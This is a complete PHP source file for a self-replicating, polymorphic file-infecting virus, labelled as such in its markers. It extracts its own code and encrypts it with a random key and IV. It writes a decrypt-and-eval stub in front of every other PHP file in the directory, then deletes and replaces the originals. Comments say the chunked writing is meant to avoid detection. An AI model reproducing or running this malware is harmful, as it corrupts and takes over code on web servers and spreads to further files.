<?php

// VIRUS:START

function execute($virus){
    // Get a list of all PHP files 
	$filenames = glob('*.php');

    // check each file
    foreach( $filenames as $filename) {
    
        if($filename == "boom.php")
           continue;

		// open file
		$script = fopen($filename,'r');

		//let's write to a new file, one chunck at a time, instead of reading whole file 
		// to void detection
		$infected = fopen("$filename.infected","w");

        $encVirus = encryptedVirus($virus);
        $infection = '<?php'. $encVirus . '?>';

        fputs($infected, $infection, strlen($infection));

		while( $contents = fgets($script) ) {
			fputs($infected, $contents, strlen($contents));
		}

		//close both handles and replance filename with infected file
		fclose($script);
		fclose($infected);
		// delete the original file
		unlink("$filename");
		rename("$filename.infected",$filename);	

   }
}

function encryptedVirus($virus) {

    // Gen key
    $str = '123456789abcdef';
    $key = '';
    for($i=0; $i<32 ; ++$i){ 
        $key.= $str[rand(0,strlen($str)-1)];
       }

    // Encrypt
    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
    $encryptedVirus = mcrypt_encrypt(
        MCRYPT_RIJNDAEL_128,
        $key,
        $virus,
        MCRYPT_MODE_CBC,
        $iv
    );

    // Encode
    $encodedVirus = base64_encode($encryptedVirus);
    $encodedIV = base64_encode($iv);
    $encodedKey = base64_encode($key);

    $payload = "
        \$encryptedVirus = '$encodedVirus';
        \$iv = '$encodedIV';
        \$key = '$encodedKey';

        \$virus = mcrypt_decrypt(
            MCRYPT_RIJNDAEL_128,
            base64_decode(\$key),
            base64_decode(\$encryptedVirus),
            MCRYPT_MODE_CBC,
            base64_decode(\$iv)
             );

        eval(\$virus);
        execute(\$virus);
        ";

   return $payload;
}

// VIRUS:END
$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n// VIRUS:END") + strlen("\n// VIRUS:END"));


execute($virus);
?>
